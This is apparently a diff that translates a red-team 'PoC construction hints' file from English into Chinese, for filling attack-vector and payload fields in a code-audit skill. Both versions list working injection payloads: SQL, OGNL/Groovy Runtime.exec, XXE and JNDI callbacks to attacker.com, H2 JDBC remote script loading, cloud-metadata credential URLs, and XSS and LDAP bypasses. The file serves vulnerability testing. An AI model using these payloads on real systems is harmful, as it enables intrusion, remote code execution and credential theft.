@@ -1,105 +1,97 @@
-# Red-Team PoC Construction Hints
+# 红队 PoC 构造提示
 
-Use these to fill the `attack_vector` and `poc_payload` fields for each
-VULNERABLE finding in skill Phase 5.
+用于在 skill 阶段 5 给每个 VULNERABLE 发现填写 `attack_vector` 和 `poc_payload`。
 
 ---
 
-## By vuln_type
+## 按 vuln_type 分类
 
 - **SQL Injection**
-  Close single/double quotes; `UNION SELECT`; blind `SLEEP(5)` time-based;
-  MyBatis `${}` directly injects column names. Stacked queries on MSSQL →
-  `xp_cmdshell` RCE.
+  闭合单 / 双引号；`UNION SELECT`；盲注 `SLEEP(5)` 时间型；
+  MyBatis 的 `${}` 直接注入列名；MSSQL 上叠加查询 → `xp_cmdshell` RCE。
 
 - **Command Injection**
-  Shell meta-chars: `;` `|` `&&` `$(cmd)` backticks. For `ProcessBuilder`
-  single-argv paths, try `-c` or PATH hijack (relative exec name + shadow `ls`).
+  shell 元字符：`;` `|` `&&` `$(cmd)` 反引号。
+  `ProcessBuilder` 单 argv 路径下，可改用 `-c` 或 PATH 劫持（相对命令名 + 阴影 `ls`）。
 
-- **Code Injection** (OGNL / MVEL / Groovy / JEXL / ScriptEngine)
-  - OGNL: `@java.lang.Runtime@getRuntime().exec({'id'})` — Struts2 S2-045 class
-  - MVEL: `Runtime.getRuntime().exec("id")`
-  - Groovy: `"id".execute().text` — the simplest one-liner
-  - JEXL: `''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(...)`
-  - ScriptEngine (Nashorn): `Java.type("java.lang.Runtime").getRuntime().exec("id")`
+- **Code Injection**（OGNL / MVEL / Groovy / JEXL / ScriptEngine）
+  - OGNL：`@java.lang.Runtime@getRuntime().exec({'id'})` —— Struts2 S2-045 经典
+  - MVEL：`Runtime.getRuntime().exec("id")`
+  - Groovy：`"id".execute().text` —— 最简一行
+  - JEXL：`''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(...)`
+  - ScriptEngine（Nashorn）：`Java.type("java.lang.Runtime").getRuntime().exec("id")`
 
 - **Path Traversal**
-  `../../../etc/passwd`, URL double-encoding `%2e%2e%2f`, Windows `\..\`,
-  UNC paths `\\attacker\share`, NULL-byte `%00.txt` on older JVMs.
+  `../../../etc/passwd`、URL 双重编码 `%2e%2e%2f`、Windows 反斜杠 `\..\`、
+  UNC 路径 `\\attacker\share`、老 JVM 的 NULL 字节 `%00.txt`。
 
 - **Zip Slip**
-  ZipEntry name containing `../../../etc/cron.d/malicious`. Combined with
-  `FileOutputStream(entry.getName())` → write arbitrary file. Writing to
-  `/etc/cron.d/` or webshell dirs → RCE.
+  ZipEntry 名含 `../../../etc/cron.d/恶意`。配合
+  `FileOutputStream(entry.getName())` → 任意写文件。
+  写入 `/etc/cron.d/` 或 webshell 目录 → RCE。
 
 - **XXE**
-  Local file read: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
-  Out-of-band SSRF / blind: `SYSTEM "http://attacker.com/exfil?d=..."` with
-  parameter entities.
+  本地文件读取：`<!ENTITY xxe SYSTEM "file:///etc/passwd">`。
+  带外 SSRF / 盲注：`SYSTEM "http://attacker.com/exfil?d=..."` 配合参数实体。
 
 - **SSRF**
-  Internal addresses: `http://127.0.0.1:8500/v1/catalog/services` (Consul),
-  cloud metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
-  DNS rebinding via `*.nip.io` or custom resolvers.
+  内网地址：`http://127.0.0.1:8500/v1/catalog/services`（Consul）；
+  云元数据：`http://169.254.169.254/latest/meta-data/iam/security-credentials/`；
+  通过 `*.nip.io` 或自建解析器做 DNS rebinding。
 
 - **LDAP Injection**
-  `*` wildcard for enumeration; `)(objectclass=*` to close and inject a second
-  filter; `admin)(&(uid=*` to bypass auth checks.
+  `*` 通配符枚举；`)(objectclass=*` 闭合并注入二级 filter；
+  `admin)(&(uid=*` 绕过认证检查。
 
 - **XPath Injection**
-  `' or '1'='1` (single quotes), `')]|//user[contains('a','`, bool-based blind
-  `string-length(password)>5`.
+  类 SQLi 的闭合 `' or '1'='1`；`')]|//user[contains('a','`；
+  布尔盲注 `string-length(password)>5`。
 
 - **Unsafe Deserialization**
-  Use public gadget chains: Commons-Collections `InvokerTransformer`,
-  ROME `ToStringBean`, ysoserial pre-built payloads. JNDI reference gadget
-  for Spring / Jackson Default Typing.
+  使用公开 gadget 链：Commons-Collections 的 `InvokerTransformer`、ROME 的
+  `ToStringBean`、ysoserial 预制 payload。Spring / Jackson Default Typing 用 JNDI
+  reference gadget。
 
 - **JNDI Injection**
-  `ldap://attacker.com/Exploit` (Log4Shell class); `rmi://attacker.com/Exploit`;
-  `dns://attacker.com/x` for blind probing. JDK 8u191+ needs
-  `trustURLCodebase=true` or local factory class.
+  `ldap://attacker.com/Exploit`（Log4Shell 同款）；`rmi://attacker.com/Exploit`；
+  盲探用 `dns://attacker.com/x`。JDK 8u191+ 需要 `trustURLCodebase=true` 或本地工厂类。
 
 - **JDBC URL Injection**
   - MySQL: `jdbc:mysql://attacker/?allowLoadLocalInfile=true&serverTimezone=UTC`
-    (client-side file read) or `&autoDeserialize=true&queryInterceptors=...`
-  - H2: `jdbc:h2:mem:test;INIT=SCRIPT FROM 'http://attacker.com/e.sql'` (RCE)
+    （客户端任意文件读）或 `&autoDeserialize=true&queryInterceptors=...`
+  - H2: `jdbc:h2:mem:test;INIT=SCRIPT FROM 'http://attacker.com/e.sql'`（RCE）
   - Postgres: `&socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://attacker.com/e.xml`
 
 - **Unvalidated Forward**
-  Internal paths normally filtered at web layer: `/WEB-INF/web.xml`,
-  `/admin.jsp`, `/actuator/env` (Spring Boot), `/console`.
+  正常被 web filter 拦截的内部路径：`/WEB-INF/web.xml`、`/admin.jsp`、
+  `/actuator/env`（Spring Boot）、`/console`。
 
 - **Open Redirect**
-  `//attacker.com` (protocol-relative), `https:attacker.com` (malformed but
-  browser-tolerant), `legit.com.attacker.com` (tail-domain injection),
-  `https://legit.com@attacker.com` (authority confusion).
+  `//attacker.com`（协议相对）；`https:attacker.com`（畸形但浏览器容忍）；
+  `legit.com.attacker.com`（域名尾注入）；`https://legit.com@attacker.com`（authority 混淆）。
 
 - **XSS**
-  Pick by output context:
-  - HTML body: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
-  - HTML attribute: `" onmouseover="alert(1)`, `" autofocus onfocus="alert(1)`
-  - JS context: `';alert(1);//`
-  - URL attribute (href/src): `javascript:alert(1)`
-  - SVG: `"><svg/onload=alert(1)>`
+  按输出上下文选择：
+  - HTML body：`<script>alert(1)</script>`、`<img src=x onerror=alert(1)>`
+  - HTML 属性：`" onmouseover="alert(1)`、`" autofocus onfocus="alert(1)`
+  - JS 上下文：`';alert(1);//`
+  - URL 属性（href / src）：`javascript:alert(1)`
+  - SVG：`"><svg/onload=alert(1)>`
 
 - **Unsafe Reflection**
-  Class names of interest: `java.lang.Runtime`, `javax.naming.InitialContext`,
-  `java.beans.XMLDecoder`. Via `Class.forName(userInput).newInstance()` → any
-  class with a visible public constructor becomes instantiable.
+  目标类名：`java.lang.Runtime`、`javax.naming.InitialContext`、
+  `java.beans.XMLDecoder`。`Class.forName(userInput).newInstance()` →
+  任何拥有公开构造器的类都能被实例化。
 
 - **Trust Boundary Violation**
-  Write `isAdmin=true` / `role=ADMIN` to session via
-  `/setPref?key=role&value=ADMIN`. Later auth check reads
-  `session.getAttribute("role")` and trusts it.
+  通过 `/setPref?key=role&value=ADMIN` 把 `isAdmin=true` / `role=ADMIN` 写入 session。
+  后续鉴权读 `session.getAttribute("role")` 直接信任。
 
 - **Sensitive Data in Log / URL**
-  No PoC construction needed — the leak is the vulnerability. Fill
-  `attack_vector` with "log exposure via centralized logging" or "URL
-  exposure via Referer / CDN logs".
+  本身不需要构造 PoC 利用 —— 泄露即漏洞。`attack_vector` 写
+  "通过中心化日志系统泄露"或"通过 Referer / CDN 日志泄露"。
 
 - **Weak Cryptography / Weak Random / Insecure TLS / JWT None / Insecure
   Cookie / Insecure Temp File / Stack Trace Exposure**
-  Also no traditional PoC. `poc_payload` can be an illustrative example of
-  exploitation (e.g., "JWT with `alg:none` header accepted as valid admin
-  token"), `attack_vector` describes the threat model.
+  也无传统 PoC。`poc_payload` 可填示意性利用（如"alg:none header 的 JWT 被服务端
+  当成有效 admin token 接受"），`attack_vector` 描述威胁模型。
